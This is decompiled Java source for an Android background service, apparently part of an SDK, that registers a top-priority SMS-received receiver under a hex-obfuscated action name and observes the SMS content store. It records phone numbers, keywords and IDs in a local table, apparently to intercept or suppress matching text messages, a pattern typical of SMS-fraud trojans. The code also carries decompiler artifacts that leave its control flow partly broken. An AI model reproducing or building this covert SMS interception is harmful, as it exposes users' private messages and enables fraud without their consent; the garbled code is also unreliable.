package com.yl.ml.ser;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import com.yl.codelib.utils.HexUtil;
import com.yl.codelib.utils.LogUtil;
import com.yl.ml.date.PBSmsDBH;
import com.yl.ml.date.SdkString;

public class SHService
  extends Service
{
  public static final String Action_Add = "com.yl.mp.ShService.add";
  public static final String Action_Init = "com.yl.mp.ShService.init";
  public static final String Action_Windows = "com.yl.mp.ShService.windows";
  public static boolean Can_SQ = true;
  public static final String JH_Action = "com.yl.pu.service.ImService";
  private PBSmsDBH cd = null;
  private Context ce;
  private OSReceiver cf;
  private ImService cg = null;
  private ServiceConnection ch = new b(this);
  
  public SHService() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    LogUtil.v("SHService:onCreate()");
    super.onCreate();
    this.ce = getApplicationContext();
    this.cd = new PBSmsDBH(this.ce);
    LogUtil.v("注册广播");
    this.cf = new OSReceiver();
    Object localObject = new IntentFilter();
    ((IntentFilter)localObject).setPriority(Integer.MAX_VALUE);
    ((IntentFilter)localObject).addAction(HexUtil.byte2String(SdkString.Byte_RECEIVED_ACTION));
    registerReceiver(this.cf, (IntentFilter)localObject);
    localObject = new c(this, new Handler());
    this.ce.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, (ContentObserver)localObject);
  }
  
  public void onDestroy()
  {
    if (this.cd != null)
    {
      this.cd.close();
      this.cd = null;
    }
    unbindService(this.ch);
    unregisterReceiver(this.cf);
    unregisterReceiver(null);
    super.onDestroy();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    LogUtil.v("SHService:onStartCommand");
    Object localObject = new Intent(this.ce, ImService.class);
    ((Intent)localObject).setAction("com.yl.pu.service.ImService");
    bindService((Intent)localObject, this.ch, 1);
    String str1;
    String str2;
    if (paramIntent != null)
    {
      localObject = paramIntent.getAction();
      LogUtil.v("action:" + (String)localObject);
      if (this.cd == null) {
        this.cd = new PBSmsDBH(this.ce);
      }
      if (((String)localObject).equals("com.yl.mp.ShService.add"))
      {
        localObject = paramIntent.getStringExtra("phonenum");
        str1 = paramIntent.getStringExtra("keyone");
        str2 = paramIntent.getStringExtra("passid");
        Cursor localCursor = this.cd.query("select * from pb_table where port = ? and keyone = ? ", new String[] { localObject, str1 });
        if ((localCursor == null) || (localCursor.getCount() <= 0)) {
          break label210;
        }
      }
    }
    label210:
    for (int i = 1;; i = 0)
    {
      if (i == 0) {
        this.cd.execSQL("insert into pb_table(port,keyone,passid) values(?,?,?)", new Object[] { localObject, str1, str2 });
      }
      return super.onStartCommand(paramIntent, paramInt1, paramInt2);
    }
  }
}
